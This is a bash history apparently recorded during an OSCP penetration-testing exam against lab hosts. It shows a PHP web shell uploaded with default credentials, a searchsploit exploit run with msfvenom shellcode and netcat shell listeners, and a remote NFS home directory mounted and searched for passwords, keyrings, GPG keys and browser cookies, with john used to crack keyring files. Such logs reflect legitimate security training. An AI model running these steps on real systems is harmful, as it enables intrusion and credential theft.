 9267  2020-12-06 03:05  cd ~/OSCP_Exam/results/192.168.35.86/scans
 9268  2020-12-06 03:06  cp ~/OSCP/8/tmp/shell.php ./
 9269  2020-12-06 03:06  ;
 9270  2020-12-06 03:06  cp ~/OSCP/8/tmp/shell.php ./
 9271  2020-12-06 03:06  cd ..
 9272  2020-12-06 03:06  cd exploit
 9273  2020-12-06 03:06  l
 9274  2020-12-06 03:06  chown  kali kali ./
 9275  2020-12-06 03:07  l
 9276  2020-12-06 03:07  cd ..
 9277  2020-12-06 03:07  l
 9278  2020-12-06 03:07  sudo chown kali kali exploit
 9279  2020-12-06 03:07  l
 9280  2020-12-06 03:07  sudo chown kali.kali exploit
 9281  2020-12-06 03:07  l
 9282  2020-12-06 03:07  cd exploit
 9283  2020-12-06 03:07  l
 9284  2020-12-06 03:07  cp ~/OSCP/8/tmp/shell.php ./
 9285  2020-12-06 03:07  l
 9286  2020-12-06 03:07  vim shell.php
 9287  2020-12-06 03:07  ip a
 9288  2020-12-06 03:07  vim shell.php
 9289  2020-12-06 03:08  ls
 9290  2020-12-06 03:08  l
 9291  2020-12-06 03:08  curl -T shell.php -u 'admin:admin' http://192.168.35.86:7080/ft2.php\?dir\=/192.168.19.35/wget%20192.168.19.35
 9292  2020-12-06 03:10  curl -T shell.php -u 'admin:admin' http://192.168.35.86:7080/ft2.php\?dir\=/192.168.19.35
 9293  2020-12-06 03:10  curl -T shell.php -u 'admin:admin' http://192.168.35.86:7080/ft2.php
 9294  2020-12-06 03:11  curl -T shell.php -u 'admin:admin' http://192.168.35.86:7080/folders/
 9295  2020-12-06 03:11  curl -T shell.php -u 'admin:admin' http://192.168.35.86:7080/folders
 9296  2020-12-06 03:28  cd ..
 9297  2020-12-06 03:28  l
 9298  2020-12-06 03:28  cd scans
 9299  2020-12-06 03:28  l
 9300  2020-12-06 03:28  cd ..
 9301  2020-12-06 03:28  sudo chown kali.kali scans
 9302  2020-12-06 03:28  l
 9303  2020-12-06 03:28  cd scans
 9304  2020-12-06 03:28  l
 9305  2020-12-06 03:29  gobuster dir -u http://192.168.35.86:7080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o 7080dirb
 9306  2020-12-06 03:29  cd ~/OSCP_Exam/results/192.168.35.86/scans
 9307  2020-12-06 03:30  gobuster dir -u http://192.168.35.86/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o 80dirb
 9308  2020-12-06 03:47  l
 9309  2020-12-06 03:47  ls
 9310  2020-12-06 03:47  cd OSCP_Exam
 9311  2020-12-06 03:47  l
 9312  2020-12-06 03:47  cd results
 9313  2020-12-06 03:47  l
 9314  2020-12-06 03:48  cd 192.168.35.87
 9315  2020-12-06 03:48  l
 9316  2020-12-06 03:48  sudo chown kali.kali scans
 9317  2020-12-06 03:48  sudo chown kali.kali exploit
 9318  2020-12-06 03:48  cd scans
 9319  2020-12-06 03:48  l
 9320  2020-12-06 03:48  ca tudp_69_tftp-nmap.txt
 9321  2020-12-06 03:48  cat udp_69_tftp-nmap.txt
 9322  2020-12-06 03:49  ls
 9323  2020-12-06 03:49  searchsploit Disk Savvy Enterprise v10.4.18
 9324  2020-12-06 03:49  searchsploit Disk Savvy Enterprise 
 9325  2020-12-06 03:50  searchsploit -x windows/remote/44156.py
 9326  2020-12-06 03:50  searchsploit -m windows/remote/44156.py
 9327  2020-12-06 03:50  l
 9328  2020-12-06 03:50  cat 44156.py
 9329  2020-12-06 03:50  vim 44156.py
 9330  2020-12-06 03:50  #msfvenom -a x86 --platform windows -p windows/shell_bind_tcp -f py -b '\x00\x02\x0a\x0d\xf8\xfd' --var-name shellcode 
 9331  2020-12-06 03:51  #msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.35 LPORT=443 EXITFUNC=thread -b "\x00\x04\x76\x77\x99\xf3" -f py
 9332  2020-12-06 03:51  #msfvenom -a x86 --platform windows -p windows/shell_bind_tcp  LHOST=192.168.19.35 LPORT=443 -f py -b '\x00\x02\x0a\x0d\xf8\xfd' --var-name shellcode 
 9333  2020-12-06 03:51  msfvenom -a x86 --platform windows -p windows/shell_bind_tcp  LHOST=192.168.19.35 LPORT=443 -f py -b '\x00\x02\x0a\x0d\xf8\xfd' --var-name shellcode 
 9334  2020-12-06 03:52  vim 44156.py
 9335  2020-12-06 03:53  l
 9336  2020-12-06 03:53  sudo nc -nlvp 443
 9337  2020-12-06 03:53  python 44156.py
 9338  2020-12-06 03:53  sudo nc -nlvp 4444
 9339  2020-12-06 03:53  python 44156.py
 9340  2020-12-06 03:54  sudo nc -nlvp 443
 9341  2020-12-06 03:55  l
 9342  2020-12-06 03:55  vim 44156.py
 9343  2020-12-06 03:55  #msfvenom -a x86 --platform windows -p windows/shell_bind_tcp  LHOST=192.168.19.35 LPORT=443 -f py -b '\x00\x02\x0a\x0d\xf8\xfd' --var-name shellcode 
 9344  2020-12-06 03:56  vim 44156.py
 9345  2020-12-06 03:56  #msfvenom -a x86 --platform windows -p windows/shell_bind_tcp  LHOST=192.168.19.35 LPORT=4444 -f py -b '\x00\x02\x0a\x0d\xf8\xfd' --var-name shellcode 
 9346  2020-12-06 03:56  msfvenom -a x86 --platform windows -p windows/shell_bind_tcp  LHOST=192.168.19.35 LPORT=4444 -f py -b '\x00\x02\x0a\x0d\xf8\xfd' --var-name shellcode 
 9347  2020-12-06 03:56  sudo nc -nlvp 4444
 9348  2020-12-06 03:57  exit
 9349  2020-12-06 03:57  vim 44156.py
 9350  2020-12-06 03:58  sudo nc -nlvp 4444
 9351  2020-12-06 03:58  python 44156.py
 9352  2020-12-06 04:00  exit
 9353  2020-12-06 04:00  searchsploit -m windows/remote/44156.py
 9354  2020-12-06 04:00  vim 44156.py
 9355  2020-12-06 04:01  l
 9356  2020-12-06 04:01  python 44156.py
 9357  2020-12-06 04:02  cd ~/OSCP_Exam/results/192.168.35.87/scans
 9358  2020-12-06 04:02  ls
 9359  2020-12-06 04:02  l
 9360  2020-12-06 04:02  cat udp_69_tftp-nmap.txt
 9361  2020-12-06 04:03  atftp 192.168.35.87
 9362  2020-12-06 04:05  tftp 10.11.1.111
 9363  2020-12-06 04:05  tftp 192.168.35.87
 9364  2020-12-06 04:05  ks
 9365  2020-12-06 04:05  ls
 9366  2020-12-06 04:05  cat tcp_80_http_gobuster.txt
 9367  2020-12-06 04:07  atftp 192.168.35.87
 9368  2020-12-06 04:08  l
 9369  2020-12-06 04:08  cat tcp_21_ftp_nmap.txt
 9370  2020-12-06 04:09  ftp Anonymous
 9371  2020-12-06 04:09  ftp 192.168.35.87
 9372  2020-12-06 04:09  l
 9373  2020-12-06 04:10  cat tcp_23_telnet-nmap.txt
 9374  2020-12-06 04:10  telnet -h
 9375  2020-12-06 04:10  telnet 
 9376  2020-12-06 04:11  l
 9377  2020-12-06 04:11  cat tcp_80_http_robots.txt
 9378  2020-12-06 04:11  cat tcp_80_http_nikto.txt
 9379  2020-12-06 04:11  vim 44156.py
 9380  2020-12-06 04:12  python 44156.py
 9381  2020-12-06 04:12  l
 9382  2020-12-06 04:12  cat tcp_80_http_index.html
 9383  2020-12-06 04:12  ls
 9384  2020-12-06 04:12  l
 9385  2020-12-06 04:12  cat users
 9386  2020-12-06 04:13  cherrytree ~/OSCP/results/10.11.1.111
 9387  2020-12-06 04:13  cherrytree ~/OSCP/results/10.11.1.111/report/insider.ctb
 9388  2020-12-06 04:14  cherrytree ~/OSCP/admin_dept/results/10.3.3.190/report/HARRY.ctb
 9389  2020-12-06 04:15  C/Windows/System32/config/RegBack/system.old 
 9390  2020-12-06 04:15  atftp 192.168.35.87
 9391  2020-12-06 04:17  l
 9392  2020-12-06 04:18  atftp 192.168.35.87
 9393  2020-12-06 04:20  ls
 9394  2020-12-06 04:20  l
 9395  2020-12-06 04:20  cat tcp_80_http_gobuster.txt
 9396  2020-12-06 04:21  python 44156.py
 9397  2020-12-06 04:21  vim 44156.py
 9398  2020-12-06 04:21  python 44156.py
 9399  2020-12-06 04:24  vim 44156.py
 9400  2020-12-06 04:24  searchsploit -m windows/remote/44156.py
 9401  2020-12-06 04:24  vim 44156.py
 9402  2020-12-06 04:25  python 44156.py
 9403  2020-12-06 04:28  vim 44156.py
 9404  2020-12-06 04:30  msfvenom -a x86 --platform windows -p windows/shell_bind_tcp  LHOST=192.168.19.35 LPORT=4444 -f py -b '\x00\x02\x0a\x0d\xf8\xfd' --var-name shellcode 
 9405  2020-12-06 04:30  exit
 9406  2020-12-06 04:30  vim 44156.py
 9407  2020-12-06 04:31  sudo rlwrap nc -lnvp 1234
 9408  2020-12-06 04:31  sudo rlwrap nc -lnvp 4444
 9409  2020-12-06 04:31  python 44156.py
 9410  2020-12-06 04:31  vim 44156.py
 9411  2020-12-06 04:32  python 44156.py
 9412  2020-12-06 04:32  vim 44156.py
 9413  2020-12-06 04:33  ip a
 9414  2020-12-06 04:33  searchsploit -m windows/remote/44156.py
 9415  2020-12-06 04:33  vim 44156.py
 9416  2020-12-06 04:34  python 44156.py
 9417  2020-12-06 04:34  cd ~/OSCP_Exam/results/192.168.35.87/scans
 9418  2020-12-06 04:34  ls
 9419  2020-12-06 04:34  l
 9420  2020-12-06 04:34  telnet
 9421  2020-12-06 04:38  telnet  192.168.35.87 23
 9422  2020-12-06 04:40  l
 9423  2020-12-06 04:40  python 44156.py
 9424  2020-12-06 04:43  cd OSCP_Exam
 9425  2020-12-06 04:43  l
 9426  2020-12-06 04:43  cd results
 9427  2020-12-06 04:43  cd 192.168.35.113
 9428  2020-12-06 04:43  l
 9429  2020-12-06 04:43  sudo chown kali.kali exploit
 9430  2020-12-06 04:43  sudo chown kali.kali scans
 9431  2020-12-06 04:43  cd scans
 9432  2020-12-06 04:43  ;l
 9433  2020-12-06 04:44  cat tcp_80_http_gobuster.txt
 9434  2020-12-06 04:45  l
 9435  2020-12-06 04:45  searchsploit phplist
 9436  2020-12-06 04:46  curl 192.168.35.113
 9437  2020-12-06 04:46  l
 9438  2020-12-06 04:46  cat tcp_80_http_gobuster.txt
 9439  2020-12-06 04:47  cd ~/OSCP_Exam/results/192.168.35.113/scans
 9440  2020-12-06 04:48  gobuster dir -u http://192.168.35.113/lists/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o 80dirb
 9441  2020-12-06 04:48  searchsploit phplist
 9442  2020-12-06 04:49  searchsploit -x php/webapps/37613.txt
 9443  2020-12-06 04:50  searchsploit -x php/webapps/18639.txt
 9444  2020-12-06 04:54  ls
 9445  2020-12-06 04:54  l
 9446  2020-12-06 04:54  cd ..
 9447  2020-12-06 04:54  sudo chown kali.kali scans
 9448  2020-12-06 04:54  sudo chown kali.kali exploit
 9449  2020-12-06 04:54  ;
 9450  2020-12-06 04:54  l
 9451  2020-12-06 04:54  cd exploit
 9452  2020-12-06 04:54  l
 9453  2020-12-06 04:54  touch phpbypass.php
 9454  2020-12-06 04:54  vim phpbypass.php
 9455  2020-12-06 04:55  chmod +x phpbypass.php
 9456  2020-12-06 04:55  l
 9457  2020-12-06 04:55  php phpbypass.php
 9458  2020-12-06 04:55  l
 9459  2020-12-06 04:55  vim phpbypass.php
 9460  2020-12-06 04:56  whatweb
 9461  2020-12-06 04:56  whatweb http://192.168.35.113/lists/admin/
 9462  2020-12-06 04:56  searchsploit phplist 3.5.1
 9463  2020-12-06 04:56  searchsploit phplist3.5.1
 9464  2020-12-06 04:56  searchsploit phplist
 9465  2020-12-06 04:57  searchsploit -x php/webapps/47989.php
 9466  2020-12-06 05:05  serachsploit php/webapps/26481.txt
 9467  2020-12-06 05:05  searchsploit php/webapps/26481.txt
 9468  2020-12-06 05:05  searchsploit -x php/webapps/26481.txt
 9469  2020-12-06 05:23  l
 9470  2020-12-06 05:23  cd ..
 9471  2020-12-06 05:23  l
 9472  2020-12-06 05:23  cd scans
 9473  2020-12-06 05:23  l
 9474  2020-12-06 05:23  cat tcp_2049_showmount.txt
 9475  2020-12-06 05:24  cat tcp_2049_nfs_nmap.txt
 9476  2020-12-06 05:24  cat tcp_111_rpc_nmap.txt
 9477  2020-12-06 05:24  l
 9478  2020-12-06 05:25  /usr/sbin/showmount -e 192.168.35.113
 9479  2020-12-06 05:25  ls
 9480  2020-12-06 05:25  cd
 9481  2020-12-06 05:25  cd OSCP/
 9482  2020-12-06 05:25  l
 9483  2020-12-06 05:25  cd it_dept
 9484  2020-12-06 05:25  l
 9485  2020-12-06 05:25  cd results
 9486  2020-12-06 05:25  l
 9487  2020-12-06 05:25  cd 10.1.1.31
 9488  2020-12-06 05:25  l
 9489  2020-12-06 05:25  cd ..
 9490  2020-12-06 05:25  l
 9491  2020-12-06 05:26  cd 10.1.1.27
 9492  2020-12-06 05:26  k
 9493  2020-12-06 05:26  l
 9494  2020-12-06 05:26  cd report
 9495  2020-12-06 05:26  l
 9496  2020-12-06 05:26  cherrytree s
 9497  2020-12-06 05:26  cherrytree share.ctb
 9498  2020-12-06 05:27  cat tcp_111_nfs_nmap.txt
 9499  2020-12-06 05:28  rpcclient -U "" 192.168.35.113
 9500  2020-12-06 05:31  cat tcp_111_nfs_nmap.txt
 9501  2020-12-06 05:31  /usr/sbin/showmount -e 192.168.35.113
 9502  2020-12-06 05:32  #mount -t nfs
 9503  2020-12-06 05:33  #sudo mount -t cifs -o port=4455 //192.168.217.10/Data -o username=Administrator,password=lab /mnt/win10_share
 9504  2020-12-06 05:33  mount -t nfs [-o vers=2] 192.168.35.113:/home/thomas /mnt/thomas -o nolock
 9505  2020-12-06 05:34  mount -t nfs -o vers=2 192.168.35.113:/home/thomas /mnt/thomas -o nolock
 9506  2020-12-06 05:34  sudo mount -t nfs -o vers=2 192.168.35.113:/home/thomas /mnt/thomas -o nolock
 9507  2020-12-06 05:34  sudo mkdir /mnt/thomas
 9508  2020-12-06 05:34  sudo mount -t nfs -o vers=2 192.168.35.113:/home/thomas /mnt/thomas -o nolock
 9509  2020-12-06 05:36  sudo mount -t nfs -o vers=2 192.168.35.113:/home/ /mnt/thomas -o nolock
 9510  2020-12-06 05:38  sudo mount -t nfs  192.168.35.113:/home/thomas /mnt/thomas -o nolock
 9511  2020-12-06 06:03  cd /mnt/thomas
 9512  2020-12-06 06:03  ;s
 9513  2020-12-06 06:03  ls
 9514  2020-12-06 06:03  cat local.txt
 9515  2020-12-06 06:06  l
 9516  2020-12-06 06:06  cat .bashrc
 9517  2020-12-06 06:06  l
 9518  2020-12-06 06:07  cd .ssh
 9519  2020-12-06 06:07  ls -al
 9520  2020-12-06 06:07  cd
 9521  2020-12-06 06:07  ls
 9522  2020-12-06 06:07  cd .ssh
 9523  2020-12-06 06:07  ls
 9524  2020-12-06 06:07  touch authorized_keys
 9525  2020-12-06 06:07  ls
 9526  2020-12-06 06:08  ls -al
 9527  2020-12-06 06:08  cd ...
 9528  2020-12-06 06:08  l
 9529  2020-12-06 06:08  cd thomas
 9530  2020-12-06 06:08  ls
 9531  2020-12-06 06:08  l
 9532  2020-12-06 06:08  cd .local
 9533  2020-12-06 06:08  ls
 9534  2020-12-06 06:08  cd share
 9535  2020-12-06 06:08  ls
 9536  2020-12-06 06:08  cd keyrings
 9537  2020-12-06 06:08  ls
 9538  2020-12-06 06:08  cat login.keyring
 9539  2020-12-06 06:09  cat user.keystore
 9540  2020-12-06 06:09  strings user.keystore 
 9541  2020-12-06 06:09  cd ..
 9542  2020-12-06 06:09  l
 9543  2020-12-06 06:09  cd ..
 9544  2020-12-06 06:09  l
 9545  2020-12-06 06:10  cd ..
 9546  2020-12-06 06:10  l
 9547  2020-12-06 06:10  cat .bash_history
 9548  2020-12-06 06:10  cd Desktop
 9549  2020-12-06 06:10  ls
 9550  2020-12-06 06:10  l
 9551  2020-12-06 06:10  cd ..
 9552  2020-12-06 06:10  l
 9553  2020-12-06 06:10  cd Documents
 9554  2020-12-06 06:10  l
 9555  2020-12-06 06:10  lcd ..
 9556  2020-12-06 06:10  cd ..
 9557  2020-12-06 06:11  find . -type f -name {password}
 9558  2020-12-06 06:12  rg ./ password
 9559  2020-12-06 06:12  rg ./ ssh
 9560  2020-12-06 06:12  rg ./ /ssh
 9561  2020-12-06 06:12  rg ./ .ssh
 9562  2020-12-06 06:12  rg password
 9563  2020-12-06 06:12  grep -i -r 'password'
 9564  2020-12-06 06:14  l
 9565  2020-12-06 06:15  cd /mnt/thomas
 9566  2020-12-06 06:15  ls
 9567  2020-12-06 06:15  cd Documents
 9568  2020-12-06 06:15  l
 9569  2020-12-06 06:15  cd ..
 9570  2020-12-06 06:15  l
 9571  2020-12-06 06:15  cd .gnupg
 9572  2020-12-06 06:15  l
 9573  2020-12-06 06:15  cd private-keys-v1.d
 9574  2020-12-06 06:16  ls
 9575  2020-12-06 06:16  l
 9576  2020-12-06 06:16  cd ..
 9577  2020-12-06 06:16  cat pubring.kbx
 9578  2020-12-06 06:16  string pubring.kbx
 9579  2020-12-06 06:16  strings pubring.kbx
 9580  2020-12-06 06:16  strings trustdb.gpg private-keys-v1.d/
 9581  2020-12-06 06:16  strings trustdb.gpg 
 9582  2020-12-06 06:16  l
 9583  2020-12-06 06:17  cd private-keys-v1.d
 9584  2020-12-06 06:17  l
 9585  2020-12-06 06:17  cd ..
 9586  2020-12-06 06:17  l
 9587  2020-12-06 06:18  gnupg --export-secret-keys
 9588  2020-12-06 06:19  sudo apt gnupg
 9589  2020-12-06 06:19  sudo apt install gnupg
 9590  2020-12-06 06:19  gnupg --export-secret-keys
 9591  2020-12-06 06:20  gpg2 --keyring pubring.kbx  --export | gpg2 --import
 9592  2020-12-06 06:20  sudo apt install gpg2
 9593  2020-12-06 06:20  sudo apt search gpg2
 9594  2020-12-06 06:20  sudo apt install gnupg2
 9595  2020-12-06 06:22  gpg2
 9596  2020-12-06 06:22  gpg2 --keyring pubring.kbx  --export | gpg2 --import
 9597  2020-12-06 06:22  l
 9598  2020-12-06 06:23  cd private-keys-v1.d
 9599  2020-12-06 06:23  l
 9600  2020-12-06 06:23  cd ..
 9601  2020-12-06 06:27  gpg2 --keyring pubring.kbx  --export | gpg2 --import
 9602  2020-12-06 06:27  ls
 9603  2020-12-06 06:27  mkdir /home/kali/.gnupg/
 9604  2020-12-06 06:28  cp ./ /home/kali/.gnupg/
 9605  2020-12-06 06:28  cp ./* /home/kali/.gnupg/
 9606  2020-12-06 06:28  cp -r ./* /home/kali/.gnupg/
 9607  2020-12-06 06:28  gpg2 --keyring pubring.kbx  --export | gpg2 --import
 9608  2020-12-06 06:28  cd /home/kali/.gnupg/pubring.kbx
 9609  2020-12-06 06:28  cd /home/kali/.gnupg/
 9610  2020-12-06 06:28  l
 9611  2020-12-06 06:29  cat lk0x000055cd96004330.kali.19282
 9612  2020-12-06 06:29  strings pubring.kbx
 9613  2020-12-06 06:29  cd /mnt/thomas/.gnupg
 9614  2020-12-06 06:29  l
 9615  2020-12-06 06:29  gpg2 --import
 9616  2020-12-06 06:31  gpg2 --no-default-keyring --keyring ~/.gnupg/pubring.kbx --list-keys
 9617  2020-12-06 06:31  gpg2  --list-keys
 9618  2020-12-06 06:31  gpg2  
 9619  2020-12-06 06:32  gpg -h
 9620  2020-12-06 06:32  l
 9621  2020-12-06 06:33  gpg2 -d pubring.kbx
 9622  2020-12-06 06:33  gpg2 -d trustdb.gpg
 9623  2020-12-06 06:36  gpg2john
 9624  2020-12-06 06:36  gpg2john pubring.kbx
 9625  2020-12-06 06:36  gpg2john trustdb.gpg
 9626  2020-12-06 06:36  l
 9627  2020-12-06 06:36  cd .local
 9628  2020-12-06 06:36  ls
 9629  2020-12-06 06:37  cd share
 9630  2020-12-06 06:37  ls
 9631  2020-12-06 06:37  cd keyrings
 9632  2020-12-06 06:37  l
 9633  2020-12-06 06:37  strings login.keyring
 9634  2020-12-06 06:37  strings user.keystore 
 9635  2020-12-06 06:38  ls
 9636  2020-12-06 06:38  cd ..
 9637  2020-12-06 06:38  l
 9638  2020-12-06 06:38  cd applications
 9639  2020-12-06 06:38  l
 9640  2020-12-06 06:39  cd ..
 9641  2020-12-06 06:39  cd icc
 9642  2020-12-06 06:39  l
 9643  2020-12-06 06:39  cd ..
 9644  2020-12-06 06:39  l
 9645  2020-12-06 06:39  cd gnome-shell
 9646  2020-12-06 06:39  l
 9647  2020-12-06 06:39  cd ..
 9648  2020-12-06 06:39  l
 9649  2020-12-06 06:39  cd ..
 9650  2020-12-06 06:39  l
 9651  2020-12-06 06:39  cd ..
 9652  2020-12-06 06:39  l
 9653  2020-12-06 06:39  cd Public
 9654  2020-12-06 06:40  ls
 9655  2020-12-06 06:40  cd ..
 9656  2020-12-06 06:40  cd Templates
 9657  2020-12-06 06:40  l
 9658  2020-12-06 06:40  cd ..
 9659  2020-12-06 06:40  cd Videos
 9660  2020-12-06 06:40  l
 9661  2020-12-06 06:40  cd ..
 9662  2020-12-06 06:40  l
 9663  2020-12-06 06:40  cat .bash_history
 9664  2020-12-06 06:41  l
 9665  2020-12-06 06:43  grep -i -r 'phplist'
 9666  2020-12-06 06:44  cd ..
 9667  2020-12-06 06:45  find . 2>/dev/null | grep admin
 9668  2020-12-06 06:53  find . 2>/dev/null | grep phplist
 9669  2020-12-06 06:54  l
 9670  2020-12-06 06:54  tree Videos
 9671  2020-12-06 06:54  tee Templates
 9672  2020-12-06 06:54  tree Templates
 9673  2020-12-06 06:54  tree Music
 9674  2020-12-06 06:55  cat .ICEauthority
 9675  2020-12-06 06:55  strings  .ICEauthority
 9676  2020-12-06 06:56  l
 9677  2020-12-06 06:56  cd .config
 9678  2020-12-06 06:56  ;s
 9679  2020-12-06 06:56  ls
 9680  2020-12-06 06:56  l
 9681  2020-12-06 06:56  cat user-dirs.dirs
 9682  2020-12-06 06:56  cat user-dirs.locale
 9683  2020-12-06 06:56  cd ibus
 9684  2020-12-06 06:57  ls
 9685  2020-12-06 06:57  cd bus
 9686  2020-12-06 06:57  ls
 9687  2020-12-06 06:57  cd ..
 9688  2020-12-06 06:57  l
 9689  2020-12-06 06:57  tree gtk-3.0
 9690  2020-12-06 06:57  tree goa-1.0
 9691  2020-12-06 06:57  tree gnome-session
 9692  2020-12-06 06:57  cd gnome-session/saved-session
 9693  2020-12-06 06:57  ls
 9694  2020-12-06 06:58  l
 9695  2020-12-06 06:59  cd ..
 9696  2020-12-06 07:00  l
 9697  2020-12-06 07:00  tree evolution
 9698  2020-12-06 07:00  tree dconf
 9699  2020-12-06 07:00  cat  dconf/user 
 9700  2020-12-06 07:00  strings  dconf/user 
 9701  2020-12-06 07:01  ls
 9702  2020-12-06 07:01  cd ..
 9703  2020-12-06 07:01  k
 9704  2020-12-06 07:01  l
 9705  2020-12-06 07:01  touch lol
 9706  2020-12-06 07:01  cd .cache
 9707  2020-12-06 07:01  ks
 9708  2020-12-06 07:01  ls
 9709  2020-12-06 07:02  cat event-sound-cache.tdb.19cbb37d83c9479ba48f59fee240cbbd.x86_64-pc-linux-gnu
 9710  2020-12-06 07:02  strings event-sound-cache.tdb.19cbb37d83c9479ba48f59fee240cbbd.x86_64-pc-linux-gnu
 9711  2020-12-06 07:02  l
 9712  2020-12-06 07:02  tree evolution
 9713  2020-12-06 07:02  tree folks
 9714  2020-12-06 07:03  ls folks/avatars
 9715  2020-12-06 07:03  tree mozilla
 9716  2020-12-06 07:04  find . 2>/dev/null | greep index.sqlite
 9717  2020-12-06 07:04  find . 2>/dev/null | grep index.sqlite
 9718  2020-12-06 07:04  cat ./mozilla/firefox/by2pyaht.default-esr/OfflineCache/index.sqlite
 9719  2020-12-06 07:05  strings ./mozilla/firefox/by2pyaht.default-esr/OfflineCache/index.sqlite
 9720  2020-12-06 07:08  #~/.local/share/keyrings
 9721  2020-12-06 07:08  cd ..
 9722  2020-12-06 07:08  cd ~/.local/share/keyrings
 9723  2020-12-06 07:08  cd .local/share/keyrings
 9724  2020-12-06 07:08  l
 9725  2020-12-06 07:08  cat default
 9726  2020-12-06 07:08  cat Default_keyring.keyring
 9727  2020-12-06 07:08  strings Default_keyring.keyring
 9728  2020-12-06 07:09  l
 9729  2020-12-06 07:09  cat login.keyring
 9730  2020-12-06 07:09  strings login.keyring
 9731  2020-12-06 07:09  strings user.keystore
 9732  2020-12-06 07:10  l
 9733  2020-12-06 07:10  cd ..
 9734  2020-12-06 07:10  l
 9735  2020-12-06 07:11  cd /mnt/thomas
 9736  2020-12-06 07:11  ls
 9737  2020-12-06 07:11  l
 9738  2020-12-06 07:11  cd .local
 9739  2020-12-06 07:11  ls
 9740  2020-12-06 07:11  l
 9741  2020-12-06 07:11  cd share
 9742  2020-12-06 07:11  ls
 9743  2020-12-06 07:11  l
 9744  2020-12-06 07:12  strings recently-used.xbel
 9745  2020-12-06 07:12  cd keyrings
 9746  2020-12-06 07:12  k
 9747  2020-12-06 07:12  l
 9748  2020-12-06 07:12  strings login.keyring
 9749  2020-12-06 07:12  strings user.keystore
 9750  2020-12-06 07:13  john  -w=/usr/share/wordlists/rockyou.txt user.keystore
 9751  2020-12-06 07:13  l
 9752  2020-12-06 07:13  john  -w=/usr/share/wordlists/rockyou.txt login.keyring
 9753  2020-12-06 07:13  l
 9754  2020-12-06 07:13  cd ..
 9755  2020-12-06 07:13  l
 9756  2020-12-06 07:13  cd gnome-shell
 9757  2020-12-06 07:13  ls
 9758  2020-12-06 07:13  cat application_state
 9759  2020-12-06 07:13  cd ..
 9760  2020-12-06 07:13  l
 9761  2020-12-06 07:16  ls
 9762  2020-12-06 07:16  tree telepathy
 9763  2020-12-06 07:16  cat  telepathy/mission-control/accounts.cfg 
 9764  2020-12-06 07:16  l
 9765  2020-12-06 07:17  tree xorg
 9766  2020-12-06 07:17  cat xorg/Xorg.0.log
 9767  2020-12-06 07:18  l
 9768  2020-12-06 07:18  tree app-info
 9769  2020-12-06 07:18  cat app-info/xmls/extensions-web.xmle
 9770  2020-12-06 07:18  cat app-info/xmls/extensions-web.xml
 9771  2020-12-06 07:19  cat app-info/xmls/extensions-web.xml | grep password
 9772  2020-12-06 07:20  l
 9773  2020-12-06 07:20  tree gnome-shell
 9774  2020-12-06 07:20  tree gnome-settings-daemon
 9775  2020-12-06 07:21  cat gnome-settings-daemon/input-sources-converted
 9776  2020-12-06 07:21  cat gnome-shell/application_state 
 9777  2020-12-06 07:21  l
 9778  2020-12-06 07:21  cd tracker
 9779  2020-12-06 07:21  l
 9780  2020-12-06 07:21  cd data
 9781  2020-12-06 07:21  ls
 9782  2020-12-06 07:21  l
 9783  2020-12-06 07:21  cat tracker-store.journal
 9784  2020-12-06 07:21  strings tracker-store.journal
 9785  2020-12-06 07:22  ls
 9786  2020-12-06 07:23  cd ..
 9787  2020-12-06 07:23  l
 9788  2020-12-06 07:23  tree gvfs-metadata
 9789  2020-12-06 07:23  cd gvfs-metadata
 9790  2020-12-06 07:23  l
 9791  2020-12-06 07:23  cat home
 9792  2020-12-06 07:23  strings home
 9793  2020-12-06 07:23  strings home-4007466a.log
 9794  2020-12-06 07:24  cat root
 9795  2020-12-06 07:24  strings root
 9796  2020-12-06 07:24  strings root-98c2278e.log
 9797  2020-12-06 07:24  ls
 9798  2020-12-06 07:24  cd ..
 9799  2020-12-06 07:24  l
 9800  2020-12-06 07:25  cd icc
 9801  2020-12-06 07:25  ls
 9802  2020-12-06 07:25  cd ..
 9803  2020-12-06 07:25  l
 9804  2020-12-06 07:25  cd ..
 9805  2020-12-06 07:25  l
 9806  2020-12-06 07:25  cd ..
 9807  2020-12-06 07:25  l
 9808  2020-12-06 07:25  strings .ICEauthority
 9809  2020-12-06 07:25  l
 9810  2020-12-06 07:26  grep -i -r 'key'
 9811  2020-12-06 07:26  cd OSCP_Exam
 9812  2020-12-06 07:26  l
 9813  2020-12-06 07:26  cd results
 9814  2020-12-06 07:26  l
 9815  2020-12-06 07:26  cd 192.168.35.97
 9816  2020-12-06 07:26  kl
 9817  2020-12-06 07:26  l
 9818  2020-12-06 07:26  cd scans
 9819  2020-12-06 07:26  cd ..
 9820  2020-12-06 07:26  l
 9821  2020-12-06 07:26  sudo chown kali.kali exploit
 9822  2020-12-06 07:26  sudo chown kali.kali scans
 9823  2020-12-06 07:26  cd scans
 9824  2020-12-06 07:26  l
 9825  2020-12-06 07:27  cat tcp_21_ftp_nmap.txt
 9826  2020-12-06 07:27  cat tcp_80_http_gobuster.txt
 9827  2020-12-06 07:27  l
 9828  2020-12-06 07:27  cat tcp_7080_http_gobuster.txt
 9829  2020-12-06 07:30  strings .mozilla/firefox/by2pyaht.default-esr/cookies.sqlite
 9830  2020-12-06 07:30  cat .local/share/evolution/addressbook/system/contacts.db
 9831  2020-12-06 07:30  strings .local/share/evolution/addressbook/system/contacts.db
 9832  2020-12-06 07:31  k
 9833  2020-12-06 07:31  l
 9834  2020-12-06 07:31  cd.local/share/evolution/addressbook/system/
 9835  2020-12-06 07:31  ls
 9836  2020-12-06 07:31  cd .local/share/evolution/addressbook/system/
 9837  2020-12-06 07:31  l
 9838  2020-12-06 07:31  cd photos
 9839  2020-12-06 07:31  l
 9840  2020-12-06 07:32  cd ..
 9841  2020-12-06 07:32  l
 9842  2020-12-06 07:32  cd tasl
 9843  2020-12-06 07:32  cd tas
 9844  2020-12-06 07:32  l
 9845  2020-12-06 07:32  cd trash
 9846  2020-12-06 07:32  l
 9847  2020-12-06 07:32  cd ..
 9848  2020-12-06 07:32  l
 9849  2020-12-06 07:32  cd ..
 9850  2020-12-06 07:32  kl
 9851  2020-12-06 07:32  cd ..
 9852  2020-12-06 07:32  l
 9853  2020-12-06 07:32  cd ..
